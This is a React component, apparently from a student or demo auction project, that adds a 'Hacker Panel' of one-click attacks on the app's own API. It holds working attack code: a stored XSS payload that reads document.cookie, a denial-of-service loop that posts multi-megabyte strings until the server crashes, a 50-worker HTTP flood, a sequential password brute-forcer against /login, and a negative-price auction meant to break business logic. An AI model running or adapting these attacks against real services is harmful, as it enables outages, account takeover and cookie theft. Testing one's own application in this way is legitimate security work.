import React, { useState } from 'react';
import { ShieldAlert, Zap, Ghost, Database, Activity, X, Flame, Lock, AlertTriangle } from 'lucide-react';
import CryptoJS from 'crypto-js';

const HackerPanel = ({ api, isOpen, onClose }) => {
  const [logs, setLogs] = useState([]);

  const addLog = (msg) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev]);

  const runPing = async () => {
    addLog("Pinging server...");
    const start = Date.now();
    try {
      await api.get('/auctions');
      const latency = Date.now() - start;
      addLog(`Pong! Server is alive. Latency: ${latency}ms`);
    } catch (e) {
      addLog(`Ping failed! Server might be down. Error: ${e.message}`);
    }
  };

  const runXSS = async () => {
    addLog("Injecting XSS payload...");
    try {
      const id = `xss_${Date.now()}`;
      const xssPayload = `<img src=x onerror="alert('XSS ATTACK SUCCESSFUL! Cookie: ' + document.cookie)">`;
      
      await api.post('/auction', {
        id,
        item: "FREE IPHONE (CLICK ME)",
        description: xssPayload, 
        min_price: 1,
        time_remaining: 300,
        seller: "hacker"
      });
      addLog("XSS Payload injected! Check the auction list.");
    } catch (e) {
      addLog(`Error: ${e.message}`);
    }
  };

  const runNuke = async () => {
    if (!confirm("Warning: This will flood the server until it crashes. Continue?")) return;
    
    addLog("Launching NUKE (DoS)...");
    const hugeString = "A".repeat(5000000);
    
    let i = 0;
    let active = true;

    while (active) {
        try {
            await api.post('/auction', {
                id: `nuke_${Date.now()}_${i}`,
                item: `NUKE_ITEM_${i}`,
                description: hugeString,
                min_price: 0,
                time_remaining: 60,
                seller: "nuker"
            });
            i++;
            addLog(`Payload ${i} sent. Server still alive...`);
            
            await new Promise(resolve => setTimeout(resolve, 50));
        } catch (e) {
            addLog(`SERVER CRASHED / UNRESPONSIVE!`);
            addLog(`Error details: ${e.message}`);
            active = false;
        }
    }
  };

  const runFlood = async () => {
    if (!confirm("Launch High-Frequency Flood Attack?")) return;
    addLog("Starting HTTP FLOOD (10s)...");
    
    let active = true;
    let count = 0;
    const workers = 50;

    const worker = async () => {
        while (active) {
            const batch = [];
            for (let i = 0; i < 20; i++) {
                batch.push(
                    api.post('/bid', { 
                        id: "flood_id", 
                        bidder: "flooder", 
                        amount: 1 
                    }).catch(() => {})
                );
            }
            await Promise.all(batch);
            count += 20;
            if (count % 500 === 0) addLog(`Flooded ${count} requests`);
        }
    };

    
    for (let i = 0; i < workers; i++) worker();

    
    setTimeout(() => {
        active = false;
        addLog(`Flood ended. Total: ${count} requests.`);
    }, 10000);
  };

  const runBruteForce = async () => {
    const targetUser = prompt("Enter username to crack: ", "admin");
    if (!targetUser) return;

    let password = prompt("Enter a start password if you have an idea. Enter a ! otherwise", "!");
    if (!password) return;

    let passwords = [password];
    let i = 0;

    while (passwords[i]) {
      try {
        const passwordHash = CryptoJS.SHA256(passwords[i]).toString();
        await api.post('/login', { username: targetUser, password: passwordHash });

        addLog(`CRACKED! Password: "${passwords[i]}"`);
        alert(`Match found!\nUser: ${targetUser}\nPass: ${passwords[i]}`);
        return;
      } catch (e) {
        addLog(`Failed: ${passwords[i]}`);
        let pass = passwords[i];
        i += 1;
        let pass1;
        let lastCharCode = pass.charCodeAt(pass.length - 1);
        if (lastCharCode !== 127) {
          pass1 = pass.slice(0, -1) + String.fromCharCode(lastCharCode + 1);
        }

        let pass2 = pass + String.fromCharCode(33);
        if (pass1) passwords.push(pass1);
        passwords.push(pass2);
      }
      await new Promise(r => setTimeout(r, 100));
    }
    addLog("Failed to crack password.");
  };

  const runChaosAuction = async () => {
      addLog("Creating Chaos Auction (Negative Price)...");
      try {
        await api.post('/auction', {
            id: `chaos_${Date.now()}`,
            item: "GLITCHED ITEM",
            description: "This item has a negative value. Bidding on it might break things.",
            min_price: -1000000,
            time_remaining: 300,
            seller: "hacker"
        });
        addLog("Chaos Auction created! Check the list.");
      } catch (e) {
          addLog(`Error: ${e.message}`);
      }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-y-0 right-0 w-96 bg-gray-900 text-green-400 p-6 shadow-2xl transform transition-transform overflow-y-auto z-50 border-l border-green-500 font-mono">
      <div className="flex justify-between items-center mb-6">
        <h2 className="text-xl font-bold flex items-center gap-2">
          <ShieldAlert /> HACKER PANEL
        </h2>
        <button onClick={onClose} className="text-gray-500 hover:text-white"><X /></button>
      </div>

      <div className="space-y-4">
        <div className="p-4 border border-green-800 rounded bg-gray-800">
            <h3 className="font-bold mb-2 flex items-center gap-2"><Activity size={16}/> Server Status</h3>
            <p className="text-xs text-gray-400 mb-2">Check if the server is responsive.</p>
            <button onClick={runPing} className="w-full bg-blue-900 hover:bg-blue-800 text-blue-100 py-2 rounded border border-blue-600 transition-colors">
                PING SERVER
            </button>
        </div>

        <div className="p-4 border border-green-800 rounded bg-gray-800">
            <h3 className="font-bold mb-2 flex items-center gap-2"><Lock size={16}/> Brute Force Login</h3>
            <p className="text-xs text-gray-400 mb-2">Crack user password using dictionary attack.</p>
            <button onClick={runBruteForce} className="w-full bg-green-900 hover:bg-green-800 text-green-100 py-2 rounded border border-green-600 transition-colors">
                Start Brute Force
            </button>
        </div>

        <div className="p-4 border border-green-800 rounded bg-gray-800">
            <h3 className="font-bold mb-2 flex items-center gap-2"><AlertTriangle size={16}/> Chaos Auction</h3>
            <p className="text-xs text-gray-400 mb-2">Create auction with negative price to break logic.</p>
            <button onClick={runChaosAuction} className="w-full bg-yellow-900 hover:bg-yellow-800 text-yellow-100 py-2 rounded border border-yellow-600 transition-colors">
                Create Glitched Item
            </button>
        </div>

        <div className="p-4 border border-green-800 rounded bg-gray-800">
            <h3 className="font-bold mb-2 flex items-center gap-2"><Zap size={16}/> XSS Injection (not working)</h3>
            <p className="text-xs text-gray-400 mb-2">Inject malicious script into auction description.</p>
            <button onClick={runXSS} className="w-full bg-green-900 hover:bg-green-800 text-green-100 py-2 rounded border border-green-600 transition-colors">
                Inject XSS Payload
            </button>
        </div>

        <div className="p-4 border border-green-800 rounded bg-gray-800">
            <h3 className="font-bold mb-2 flex items-center gap-2"><Database size={16}/> DoS / Nuke</h3>
            <p className="text-xs text-gray-400 mb-2">Overload server storage with massive payloads.</p>
            <button onClick={runNuke} className="w-full bg-red-900 hover:bg-red-800 text-red-100 py-2 rounded border border-red-600 transition-colors">
                LAUNCH NUKE
            </button>
        </div>

        <div className="p-4 border border-green-800 rounded bg-gray-800">
            <h3 className="font-bold mb-2 flex items-center gap-2"><Flame size={16}/> HTTP Flood</h3>
            <p className="text-xs text-gray-400 mb-2">Spam server with high-frequency requests.</p>
            <button onClick={runFlood} className="w-full bg-orange-900 hover:bg-orange-800 text-orange-100 py-2 rounded border border-orange-600 transition-colors">
                START FLOOD
            </button>
        </div>
      </div>

      <div className="mt-8">
        <h3 className="font-bold mb-2 flex items-center gap-2"><Activity size={16}/> Attack Logs</h3>
        <div className="bg-black p-2 rounded h-48 overflow-y-auto text-xs font-mono border border-gray-700">
            {logs.map((log, i) => <div key={i} className="mb-1 border-b border-gray-900 pb-1">{log}</div>)}
            {logs.length === 0 && <span className="text-gray-600">Ready to attack...</span>}
        </div>
      </div>
    </div>
  );
};

export default HackerPanel;
